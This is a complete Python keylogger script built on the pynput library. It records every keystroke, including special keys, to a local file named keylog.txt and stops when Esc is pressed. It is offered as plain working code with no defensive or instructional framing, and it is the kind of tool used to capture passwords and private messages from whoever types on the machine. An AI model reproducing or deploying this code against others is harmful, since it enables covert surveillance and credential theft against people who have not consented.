from pynput import keyboard

# Define the log file
log_file = "keylog.txt"

# Callback function for key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Enter, Backspace)
        with open(log_file, "a") as f:
            f.write(f" {key} ")

# Callback function for key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:  # Exit on 'Esc' key
        return False

# Listen to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
